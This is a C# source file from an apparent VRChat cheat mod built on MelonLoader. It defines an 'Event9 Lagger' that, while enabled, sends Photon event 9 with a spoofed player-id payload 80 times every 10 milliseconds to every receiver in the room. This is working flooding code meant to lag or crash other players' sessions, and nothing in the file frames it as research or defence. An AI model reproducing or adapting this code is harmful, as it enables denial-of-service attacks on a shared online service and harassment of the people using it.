
using System;
using System.Collections;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ExitGames.Client.Photon;
using Il2CppSystem;
using MelonLoader;
using Photon.Realtime;
using UnityEngine;
using VRC.SDKBase;





namespace Daydream.Client.Hacks
{

    internal class event9
    {
        // FOR SOME REASON CANNOT BE SEARIALISED
        private static bool enabled = false;
        public static void enable(bool val)
        {
            Classes.Daydream.HackUpdate("Event9 Lagger",val);
            enabled = val;
            MelonCoroutines.Start(run());
        }
        private static IEnumerator run()
        {
            // byte[] rpcData =
            // {
            //  106, 191, 218, 132, 88, 12, 0, 0, 0, 7,
            //   0, 58, 118, 213, 255, 255, 50, 47, 14, 0,
            //   255, 0, 0, 0, 0, 9, 0, 0, 0, 13,
            //   0, 69, 110, 97, 98, 108, 101, 77, 101, 115,
            //   104, 82, 80, 67, 0, 0, 0, 0, 0, 0,
            //    0, 2
            //  };
            //
            byte[] byteArray = new byte[8];
            System.Buffer.BlockCopy(System.BitConverter.GetBytes(int.Parse(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0.playerId.ToString() + "00001")), 0, byteArray, 0, 4);
            for (; ; )
            {
                if (enabled == true)
                {
                    for (int i = 0; i < 80; i++)
                    {
                        Hacks.PhotonExtentions.OpRaiseEvent(9, byteArray, new RaiseEventOptions
                        {
                            field_Public_ReceiverGroup_0 = 0,
                            field_Public_EventCaching_0 = 0
                        }, SendOptions.SendReliable);
                    }
                    yield return new WaitForSecondsRealtime(0.01f);
                }
                else
                {
                    yield break;
                }
            }
        }
    }
}
